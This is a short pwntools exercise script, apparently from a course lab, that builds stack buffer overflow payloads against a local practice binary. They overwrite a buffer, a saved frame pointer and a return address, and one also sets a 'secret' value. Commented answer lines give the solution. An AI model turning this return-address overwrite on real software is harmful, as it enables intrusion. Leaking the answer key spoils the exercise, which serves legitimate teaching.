#!/usr/bin/env python3
from pwn import *

io = process(['./run.sh', 'part2'])


# Stop at task1
io.recvuntil(b"Enter some bytes: ")

# ================================================= Task1 =================================================
succeed1_addr = 0x0  # TODO: Fill in the succeed1 address you found

# ans
# succeed1_addr = 0x80000488

input_text = b''
input_text += b'A' * 4         # Fill up buf[0..3]
input_text += b'B' * 4         # Fill up Saved Frame Pointer
input_text += p32(succeed1_addr)

io.sendline(input_text)

# =========================================================================================================


# Stop at task2
result = io.recvuntil(b"Enter some bytes: ")
# print the result for task1 
lines = result.split(b'\r\n')
for line in lines:
    if b'Returning' in line or b'Task' in line or b'complete' in line:
        print(line.decode('utf-8', errors='ignore'))


# ================================================= Task2 =================================================
succeed2_addr = 0x0  # TODO: Fill in the succeed2 address you found

# ans
# succeed2_addr = 0x80000498

# TODO: Complete the input_text that satisfy the requirement for succeed2
input_text2 = b''

# ans:
# input_text2 += b'A' * 4       # Fill up buf[0..3]
# input_text2 += p32(0x1212)    # Set secret to 0x1212
# input_text2 += b'B' * 4       # Fill up saved frame pointer
# input_text2 += p32(succeed2_addr) # Overwrite return address

io.sendline(input_text2)

# =========================================================================================================

io.interactive()